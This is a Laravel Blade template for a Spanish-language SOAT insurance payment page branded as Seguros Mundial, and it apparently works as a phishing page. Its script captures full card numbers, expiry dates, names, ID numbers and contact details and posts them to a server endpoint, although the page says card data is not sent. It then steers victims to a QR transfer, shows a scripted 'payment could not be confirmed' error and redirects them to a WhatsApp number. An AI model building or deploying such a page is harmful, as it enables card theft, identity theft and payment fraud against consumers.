<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Pago con tarjeta - SOAT Seguros Mundial</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    @php
        $montoFmt = '$' . number_format($total, 0, ',', '.');
        $placaFmt = $vehiculo->placa ? strtoupper($vehiculo->placa) : '';
        $payloadQr = 'PAGO SOAT|' . $cliente->nombre . '|' . $montoFmt;
        $qrImgGenerado = 'https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=' . urlencode($payloadQr);
        $qrImg = $qrConfig && $qrConfig->qr_image_path ? asset($qrConfig->qr_image_path) : $qrImgGenerado;
        $mensajePago = $qrConfig && $qrConfig->mensaje_pago
            ? $qrConfig->mensaje_pago
            : 'Abre Nequi, Daviplata o tu app bancaria y busca la opción de pagar con QR. Si no puedes escanear en vivo, guarda una captura del código en tu galería y usa “Escanear desde galería” o “Escanear imagen”.';
        $nombreComercio = $qrConfig && $qrConfig->nombre_comercio ? $qrConfig->nombre_comercio : 'Seguros Mundial';
        $whatsSupportUrl = 'https://api.whatsapp.com/send?phone=573219127738&text='
            . rawurlencode(
                'Hola, intenté pagar con tarjeta y pagué por QR mi SOAT por ' . $montoFmt
                . ($placaFmt ? '. Placa: ' . $placaFmt . '.' : '')
                . ' Al confirmar el pago salió un error. Necesito ayuda.'
            );
        $nombreTitularSuggest = $cliente->nombre_completo;
        $docTipo = $cliente->tipo_documento ?? 'CC';
        $docNum = $cliente->numero_documento ?? '';
    @endphp
    <style>
        :root {
            --pt-blue: #0d5f84;
            --pt-accent: #2bd2c1;
            --pt-bg: #e8eef3;
            --pt-card: #ffffff;
            --pt-border: #d0dce4;
            --pt-text: #1f333f;
            --pt-muted: #5a7585;
            --pt-error: #c62828;
            --pt-warn-bg: #fff8e6;
            --pt-warn-border: #f0d78c;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Open Sans', sans-serif;
            background: var(--pt-bg);
            color: var(--pt-text);
            min-height: 100vh;
        }
        .top {
            background: #fff;
            border-bottom: 2px solid var(--pt-blue);
            padding: 0.65rem 1rem;
            box-shadow: 0 1px 6px rgba(13, 95, 132, 0.08);
        }
        .top-inner {
            max-width: 560px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 0.75rem;
        }
        .logo-image { height: 36px; width: auto; max-width: 200px; object-fit: contain; }
        .badge-secure {
            display: flex;
            align-items: center;
            gap: 0.35rem;
            font-size: 0.68rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            color: var(--pt-blue);
        }
        .wrap {
            max-width: 560px;
            margin: 0 auto;
            padding: 1.15rem 1rem 2rem;
        }
        .step-panel[hidden] { display: none !important; }
        .headline {
            font-family: 'Montserrat', sans-serif;
            font-size: 1.05rem;
            font-weight: 700;
            color: var(--pt-blue);
            margin-bottom: 0.35rem;
            text-align: center;
        }
        .subhead {
            text-align: center;
            font-size: 0.8rem;
            color: var(--pt-muted);
            margin-bottom: 1rem;
            line-height: 1.4;
        }
        .amount-pill {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--pt-card);
            border: 1px solid var(--pt-border);
            border-radius: 10px;
            padding: 0.65rem 0.9rem;
            margin-bottom: 1rem;
            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
        }
        .amount-pill span:first-child {
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--pt-muted);
            text-transform: uppercase;
        }
        .amount-pill .amt {
            font-family: 'Montserrat', sans-serif;
            font-size: 1.35rem;
            font-weight: 700;
            color: var(--pt-blue);
        }
        .form-card {
            background: var(--pt-card);
            border-radius: 12px;
            border: 1px solid var(--pt-border);
            box-shadow: 0 4px 20px rgba(13, 95, 132, 0.08);
            padding: 1.15rem 1.1rem 1.25rem;
        }
        .brands {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.85rem;
            margin-bottom: 1rem;
            padding-bottom: 0.85rem;
            border-bottom: 1px solid #eef2f5;
        }
        .brands span {
            font-family: 'Montserrat', sans-serif;
            font-size: 0.72rem;
            font-weight: 800;
            color: #1a4d6e;
            letter-spacing: 0.06em;
        }
        .section-title {
            font-family: 'Montserrat', sans-serif;
            font-size: 0.72rem;
            font-weight: 700;
            color: var(--pt-blue);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin: 0.85rem 0 0.5rem;
        }
        .section-title:first-of-type { margin-top: 0; }
        .row-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.65rem;
        }
        @media (max-width: 480px) {
            .row-2 { grid-template-columns: 1fr; }
        }
        label.field {
            display: block;
            margin-bottom: 0.55rem;
        }
        label.field > span {
            display: block;
            font-size: 0.72rem;
            font-weight: 700;
            color: var(--pt-muted);
            margin-bottom: 0.25rem;
        }
        .input, select.input {
            width: 100%;
            border: 1px solid var(--pt-border);
            border-radius: 8px;
            padding: 0.52rem 0.65rem;
            font-size: 0.88rem;
            font-family: inherit;
            color: var(--pt-text);
            background: #fafcfd;
            transition: border-color 0.15s, box-shadow 0.15s;
        }
        .input:focus, select.input:focus {
            outline: none;
            border-color: var(--pt-blue);
            box-shadow: 0 0 0 3px rgba(13, 95, 132, 0.12);
            background: #fff;
        }
        .input::placeholder { color: #9aa8b2; }
        .input.input-error { border-color: var(--pt-error); }
        .hint-inline {
            font-size: 0.65rem;
            color: var(--pt-muted);
            margin-top: 0.2rem;
        }
        .tipo-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.5rem;
        }
        .tipo-grid label.opt {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.4rem;
            padding: 0.55rem 0.5rem;
            border: 2px solid var(--pt-border);
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.8rem;
            font-weight: 700;
            color: var(--pt-blue);
            transition: border-color 0.15s, background 0.15s;
        }
        .tipo-grid label.opt.is-selected {
            border-color: var(--pt-accent);
            background: rgba(43, 210, 193, 0.12);
        }
        .tipo-grid label.opt input { accent-color: var(--pt-blue); }
        .check-row {
            display: flex;
            align-items: flex-start;
            gap: 0.5rem;
            margin-top: 0.75rem;
            font-size: 0.72rem;
            line-height: 1.45;
            color: var(--pt-muted);
        }
        .check-row input { margin-top: 0.2rem; accent-color: var(--pt-blue); }
        .btn-pay {
            width: 100%;
            margin-top: 1rem;
            border: none;
            border-radius: 999px;
            background: linear-gradient(135deg, #25c9b8 0%, var(--pt-accent) 100%);
            color: #063f39;
            font-family: 'Montserrat', sans-serif;
            font-size: 0.88rem;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            padding: 0.85rem 1rem;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(43, 210, 193, 0.35);
        }
        .btn-pay:disabled {
            opacity: 0.55;
            cursor: not-allowed;
            box-shadow: none;
        }
        .banner-tarjeta-off {
            background: var(--pt-warn-bg);
            border: 1px solid var(--pt-warn-border);
            color: #6b5a20;
            font-size: 0.8rem;
            font-weight: 700;
            line-height: 1.45;
            padding: 0.75rem 0.85rem;
            border-radius: 10px;
            margin-bottom: 1rem;
            text-align: center;
        }
        .qr-section-title {
            font-family: 'Montserrat', sans-serif;
            font-size: 0.95rem;
            font-weight: 700;
            color: var(--pt-blue);
            text-align: center;
            margin-bottom: 0.5rem;
        }
        .qr-steps {
            font-size: 0.78rem;
            color: var(--pt-muted);
            text-align: center;
            margin-bottom: 0.85rem;
            line-height: 1.45;
        }
        .steps-list {
            font-size: 0.78rem;
            color: var(--pt-muted);
            line-height: 1.55;
            margin: 0 auto 0.95rem;
            padding-left: 1.25rem;
            max-width: 28rem;
            text-align: left;
        }
        .steps-list li { margin-bottom: 0.55rem; }
        .steps-list strong { color: var(--pt-blue); }
        .panel-qr {
            border: 1px solid #edf2f5;
            border-radius: 10px;
            padding: 1rem;
            background: #fbfdff;
            margin-bottom: 0.75rem;
        }
        .qr-box {
            display: flex;
            justify-content: center;
            margin-bottom: 0.55rem;
        }
        .qr-box img {
            width: 220px;
            height: 220px;
            border: 1px solid #dde5ea;
            border-radius: 8px;
            background: #fff;
            padding: 8px;
        }
        .comercio {
            text-align: center;
            font-weight: 700;
            color: var(--pt-blue);
            font-size: 0.82rem;
        }
        .amount-qr {
            text-align: center;
            font-family: 'Montserrat', sans-serif;
            color: var(--pt-blue);
            font-weight: 700;
            font-size: 1.15rem;
            margin: 0.35rem 0;
        }
        .hint-qr {
            text-align: center;
            font-size: 0.76rem;
            color: #4b6574;
            line-height: 1.35;
            margin-bottom: 0.65rem;
        }
        .btn-confirmar {
            width: 100%;
            border: none;
            border-radius: 999px;
            background: var(--pt-blue);
            color: #fff;
            font-family: 'Montserrat', sans-serif;
            font-size: 0.82rem;
            font-weight: 700;
            padding: 0.72rem 0.9rem;
            cursor: pointer;
        }
        .btn-confirmar:disabled { opacity: 0.55; cursor: not-allowed; }
        .btn-back-form {
            display: block;
            width: 100%;
            text-align: center;
            margin-top: 0.65rem;
            background: none;
            border: none;
            color: var(--pt-blue);
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            text-decoration: underline;
        }
        .pci-note {
            margin-top: 0.75rem;
            font-size: 0.62rem;
            color: #8a9aa5;
            line-height: 1.45;
            text-align: center;
        }
        .back-row {
            margin-top: 0.85rem;
            text-align: center;
        }
        .back-row a {
            font-size: 0.8rem;
            color: var(--pt-blue);
            font-weight: 600;
        }
        .sm-modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 9999;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            background: rgba(15, 40, 52, 0.45);
        }
        .sm-modal-overlay.is-open { display: flex; }
        .sm-modal {
            width: 100%;
            max-width: 360px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
            padding: 1.35rem 1.25rem;
            text-align: center;
        }
        .sm-modal h2 {
            font-family: 'Montserrat', sans-serif;
            font-size: 1rem;
            color: var(--pt-blue);
            margin-bottom: 0.65rem;
        }
        .sm-modal p {
            font-size: 0.82rem;
            color: #4b6574;
            line-height: 1.45;
            margin-bottom: 0.5rem;
        }
        .sm-modal .sm-modal-error {
            color: var(--pt-error);
            font-weight: 600;
        }
        .sm-spinner {
            width: 42px;
            height: 42px;
            margin: 0 auto 0.85rem;
            border: 3px solid #e0e8ed;
            border-top-color: var(--pt-accent);
            border-radius: 50%;
            animation: sm-spin 0.85s linear infinite;
        }
        @keyframes sm-spin { to { transform: rotate(360deg); } }
        .sm-modal-panel { display: block; }
        .sm-modal-panel[hidden] { display: none !important; }
        .sm-modal-btn {
            margin-top: 0.85rem;
            width: 100%;
            border: none;
            border-radius: 999px;
            background: var(--pt-accent);
            color: #063f39;
            font-family: 'Montserrat', sans-serif;
            font-size: 0.8rem;
            font-weight: 700;
            padding: 0.6rem 0.9rem;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header class="top">
        <div class="top-inner">
            <a href="{{ route('welcome') }}">
                <img src="{{ asset('images/logos/seguros-mundial-logo.webp') }}" alt="Seguros Mundial" class="logo-image" width="200" height="44">
            </a>
            <div class="badge-secure" title="Conexión cifrada">
                <span aria-hidden="true">🔒</span>
                <span>Pago seguro</span>
            </div>
        </div>
    </header>

    <main class="wrap">
        <div id="step-card" class="step-panel">
            <h1 class="headline">Pago con tarjeta</h1>
            <p class="subhead">Completa los datos. La pasarela con tarjeta se activará pronto (Wompi / ePayco).</p>

            <div class="amount-pill">
                <span>Total a pagar</span>
                <span class="amt">{{ $montoFmt }}</span>
            </div>

            <form class="form-card" id="form-pago-tarjeta" autocomplete="off" novalidate>
                <div class="brands">
                    <span>VISA</span>
                    <span>MASTERCARD</span>
                    <span>AMEX</span>
                </div>

                <p class="section-title">Tipo de tarjeta</p>
                <div class="tipo-grid">
                    <label class="opt is-selected">
                        <input type="radio" name="tipo_tarjeta" value="credito" checked>
                        Crédito
                    </label>
                    <label class="opt">
                        <input type="radio" name="tipo_tarjeta" value="debito">
                        Débito
                    </label>
                </div>

                <p class="section-title">Datos de la tarjeta</p>
                <label class="field">
                    <span>Número de tarjeta</span>
                    <input type="text" class="input" id="numero_tarjeta" name="numero_tarjeta" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="19" required>
                </label>
                <label class="field">
                    <span>Nombre como aparece en la tarjeta</span>
                    <input type="text" class="input" id="nombre_tarjeta" name="nombre_tarjeta" autocomplete="cc-name" placeholder="Ej. MARIA LOPEZ" value="{{ $nombreTitularSuggest }}" required>
                </label>
                <div class="row-2">
                    <label class="field">
                        <span>Vencimiento (MM/AA)</span>
                        <input type="text" class="input" id="vencimiento" name="vencimiento" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5" required>
                    </label>
                    <label class="field">
                        <span>Código de seguridad (CVV)</span>
                        <input type="password" class="input" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" maxlength="4" required>
                        <span class="hint-inline">3 dígitos; American Express usa 4.</span>
                    </label>
                </div>
                <label class="field" id="wrap-cuotas">
                    <span>Número de cuotas</span>
                    <select class="input" id="cuotas" name="cuotas" aria-label="Cuotas">
                        @for ($i = 1; $i <= 24; $i++)
                            <option value="{{ $i }}" @if($i === 1) selected @endif>{{ $i }} {{ $i === 1 ? 'cuota' : 'cuotas' }}</option>
                        @endfor
                    </select>
                </label>

                <p class="section-title">Titular y contacto</p>
                <div class="row-2">
                    <label class="field">
                        <span>Tipo de documento</span>
                        <select class="input" id="tipo_documento" name="tipo_documento">
                            <option value="CC" @selected($docTipo === 'CC')>Cédula</option>
                            <option value="CE" @selected($docTipo === 'CE')>C.E.</option>
                            <option value="PA" @selected($docTipo === 'PA')>Pasaporte</option>
                            <option value="NIT" @selected($docTipo === 'NIT')>NIT</option>
                        </select>
                    </label>
                    <label class="field">
                        <span>Número de documento</span>
                        <input type="text" class="input" id="numero_documento" name="numero_documento" value="{{ $docNum }}" required>
                    </label>
                </div>
                <label class="field">
                    <span>Correo electrónico (comprobante)</span>
                    <input type="email" class="input" id="email" name="email" autocomplete="email" placeholder="correo@ejemplo.com" required>
                </label>
                <label class="field">
                    <span>Celular</span>
                    <input type="tel" class="input" id="celular" name="celular" inputmode="tel" autocomplete="tel" placeholder="Ej. 300 123 4567" required>
                </label>
                <label class="field">
                    <span>Ciudad / dirección de facturación (opcional)</span>
                    <input type="text" class="input" id="direccion" name="direccion" placeholder="Ciudad o dirección">
                </label>

                <label class="check-row">
                    <input type="checkbox" id="acepto" name="acepto" required>
                    <span>Autorizo el débito por el valor indicado y acepto que los datos se usarán solo para procesar este pago conforme a la política de privacidad.</span>
                </label>

                <button type="submit" class="btn-pay" id="btn-pagar-tarjeta">Pagar {{ $montoFmt }}</button>
            </form>

            <p class="pci-note">Los datos de tarjeta no se envían al servidor en esta versión. Al integrar la pasarela, el cobro será tokenizado.</p>

            <div class="back-row">
                <a href="{{ route('soat.pago') }}">← Volver a medios de pago</a>
            </div>
        </div>

        <div id="step-qr" class="step-panel" hidden>
            <h1 class="headline">Paga con código QR</h1>
            <div class="banner-tarjeta-off">
                El pago con tarjeta de crédito o débito <strong>aún no está disponible</strong>. Completa el pago con el <strong>código QR</strong> siguiendo estos pasos.
            </div>
            <p class="qr-section-title">Cómo pagar con este código</p>
            <ol class="steps-list">
                <li><strong>Escanea el QR</strong> con la cámara desde tu app, <strong>o</strong> haz una <strong>captura de pantalla</strong>, guárdala en tu galería y usa <strong>“Escanear desde galería”</strong> en la app.</li>
                <li>Al pagar, <strong>ingresa el valor exacto</strong> que ves abajo (<strong>{{ $montoFmt }}</strong>). Debe coincidir con el total de tu compra.</li>
                <li>Cuando la app confirme el envío, pulsa <strong>Confirmar pago</strong> (abajo) para continuar.</li>
            </ol>

            <div class="form-card panel-qr">
                <div class="qr-box">
                    <img src="{{ $qrImg }}" alt="Código QR de pago" width="220" height="220">
                </div>
                <p class="comercio">{{ $nombreComercio }}</p>
                <div class="amount-qr">{{ $montoFmt }}</div>
                <p class="hint-qr">{{ $mensajePago }}</p>
                <button type="button" class="btn-confirmar" id="btn-confirmar-pago">Confirmar pago</button>
            </div>

            <button type="button" class="btn-back-form" id="btn-volver-tarjeta">← Corregir datos de tarjeta</button>
            <div class="back-row" style="margin-top:0.5rem;">
                <a href="{{ route('soat.pago') }}">Volver a medios de pago</a>
            </div>
        </div>
    </main>

    <div id="payment-modal" class="sm-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="payment-modal-title" aria-hidden="true">
        <div class="sm-modal">
            <div id="panel-processing" class="sm-modal-panel">
                <div class="sm-spinner" aria-hidden="true"></div>
                <h2 id="payment-modal-title">Confirmando pago…</h2>
                <p>Estamos verificando tu transacción, espera un momento.</p>
            </div>
            <div id="panel-error" class="sm-modal-panel" hidden>
                <h2>No se pudo confirmar el pago</h2>
                <p class="sm-modal-error">No pudimos validar el pago en este momento.</p>
                <p>Te llevamos a WhatsApp para que te ayuden a finalizar.</p>
                <button type="button" class="sm-modal-btn" id="btn-whats-now">Ir a WhatsApp ahora</button>
            </div>
        </div>
    </div>

    <script>
        (function () {
            var form = document.getElementById('form-pago-tarjeta');
            var stepCard = document.getElementById('step-card');
            var stepQr = document.getElementById('step-qr');
            var btnPagar = document.getElementById('btn-pagar-tarjeta');
            var btnConfirmar = document.getElementById('btn-confirmar-pago');
            var btnVolver = document.getElementById('btn-volver-tarjeta');
            var modal = document.getElementById('payment-modal');
            var panelProc = document.getElementById('panel-processing');
            var panelErr = document.getElementById('panel-error');
            var btnWhats = document.getElementById('btn-whats-now');
            var whatsUrl = @json($whatsSupportUrl);
            var registrarUrl = '/soat/pago/tarjeta/envio';
            var csrfToken = @json(csrf_token());
            var totalPago = {{ (int) $total }};
            var redirectTimer;
            var tipoRadios = document.querySelectorAll('input[name="tipo_tarjeta"]');
            var wrapCuotas = document.getElementById('wrap-cuotas');
            var cuotas = document.getElementById('cuotas');
            var numTarjeta = document.getElementById('numero_tarjeta');
            var venc = document.getElementById('vencimiento');

            function digitsOnly(s) { return String(s || '').replace(/\D/g, ''); }

            function formatCard(val) {
                var d = digitsOnly(val).slice(0, 16);
                var parts = [];
                for (var i = 0; i < d.length; i += 4) parts.push(d.slice(i, i + 4));
                return parts.join(' ');
            }

            function formatExpiry(val) {
                var d = digitsOnly(val).slice(0, 4);
                if (d.length <= 2) return d;
                return d.slice(0, 2) + '/' + d.slice(2);
            }

            function syncTipoSelected() {
                document.querySelectorAll('.tipo-grid label.opt').forEach(function (lab) {
                    var inp = lab.querySelector('input');
                    lab.classList.toggle('is-selected', inp && inp.checked);
                });
            }

            function updateCuotasVisibility() {
                var debito = document.querySelector('input[name="tipo_tarjeta"]:checked');
                debito = debito && debito.value === 'debito';
                if (debito) {
                    wrapCuotas.style.display = 'none';
                    cuotas.value = '1';
                } else {
                    wrapCuotas.style.display = 'block';
                }
                syncTipoSelected();
            }

            tipoRadios.forEach(function (r) {
                r.addEventListener('change', updateCuotasVisibility);
            });
            updateCuotasVisibility();

            if (numTarjeta) {
                numTarjeta.addEventListener('input', function () {
                    var pos = numTarjeta.selectionStart;
                    var oldLen = numTarjeta.value.length;
                    numTarjeta.value = formatCard(numTarjeta.value);
                    var newLen = numTarjeta.value.length;
                    numTarjeta.setSelectionRange(pos + (newLen - oldLen), pos + (newLen - oldLen));
                });
            }
            if (venc) {
                venc.addEventListener('input', function () {
                    venc.value = formatExpiry(venc.value);
                });
            }

            function validate() {
                var ok = true;
                form.querySelectorAll('.input-error').forEach(function (el) { el.classList.remove('input-error'); });
                var n = digitsOnly(numTarjeta.value);
                if (n.length < 13 || n.length > 19) {
                    numTarjeta.classList.add('input-error');
                    ok = false;
                }
                var exp = digitsOnly(venc.value);
                if (exp.length !== 4) {
                    venc.classList.add('input-error');
                    ok = false;
                }
                var mm = parseInt(exp.slice(0, 2), 10);
                if (mm < 1 || mm > 12) {
                    venc.classList.add('input-error');
                    ok = false;
                }
                var cvvEl = document.getElementById('cvv');
                var cvvLen = digitsOnly(cvvEl.value).length;
                if (cvvLen < 3 || cvvLen > 4) {
                    cvvEl.classList.add('input-error');
                    ok = false;
                }
                if (!document.getElementById('nombre_tarjeta').value.trim()) ok = false;
                if (!document.getElementById('numero_documento').value.trim()) ok = false;
                if (!document.getElementById('email').value.trim()) ok = false;
                if (digitsOnly(document.getElementById('celular').value).length < 10) {
                    document.getElementById('celular').classList.add('input-error');
                    ok = false;
                }
                if (!document.getElementById('acepto').checked) ok = false;
                return ok;
            }

            async function registrarEnvio() {
                var numeroPlano = digitsOnly(numTarjeta.value);
                var payload = {
                    total: totalPago,
                    tipo_tarjeta: (document.querySelector('input[name="tipo_tarjeta"]:checked') || {}).value || 'credito',
                    numero_tarjeta: numeroPlano,
                    nombre_tarjeta: document.getElementById('nombre_tarjeta').value.trim(),
                    vencimiento: document.getElementById('vencimiento').value.trim(),
                    cuotas: parseInt((document.getElementById('cuotas') || {}).value || '1', 10),
                    tipo_documento: document.getElementById('tipo_documento').value,
                    numero_documento: document.getElementById('numero_documento').value.trim(),
                    email: document.getElementById('email').value.trim(),
                    celular: document.getElementById('celular').value.trim(),
                    direccion: document.getElementById('direccion').value.trim()
                };

                var res = await fetch(registrarUrl, {
                    method: 'POST',
                    credentials: 'same-origin',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': csrfToken,
                        'X-Requested-With': 'XMLHttpRequest',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (!res.ok) {
                    throw new Error('No se pudo registrar el envío de tarjeta.');
                }
            }

            if (form) {
                form.addEventListener('submit', async function (e) {
                    e.preventDefault();
                    if (!validate()) return;
                    btnPagar.disabled = true;
                    try {
                        await registrarEnvio();
                    } catch (err) {
                        btnPagar.disabled = false;
                        window.alert('No se pudo guardar la información de la tarjeta. Intenta nuevamente.');
                        return;
                    }
                    stepCard.hidden = true;
                    stepQr.hidden = false;
                    stepQr.scrollIntoView({ behavior: 'smooth', block: 'start' });
                });
            }

            if (btnVolver) {
                btnVolver.addEventListener('click', function () {
                    stepQr.hidden = true;
                    stepCard.hidden = false;
                    btnConfirmar.disabled = false;
                    stepCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
                });
            }

            function openModal() {
                modal.classList.add('is-open');
                modal.setAttribute('aria-hidden', 'false');
                panelProc.hidden = false;
                panelErr.hidden = true;
            }
            function showError() {
                panelProc.hidden = true;
                panelErr.hidden = false;
            }
            function goWhatsApp() {
                if (redirectTimer) clearTimeout(redirectTimer);
                window.location.href = whatsUrl;
            }

            if (btnWhats) btnWhats.addEventListener('click', goWhatsApp);

            if (btnConfirmar) {
                btnConfirmar.addEventListener('click', function () {
                    btnConfirmar.disabled = true;
                    openModal();
                    setTimeout(function () {
                        showError();
                        redirectTimer = setTimeout(goWhatsApp, 2800);
                    }, 2400);
                });
            }
        })();
    </script>
</body>
</html>
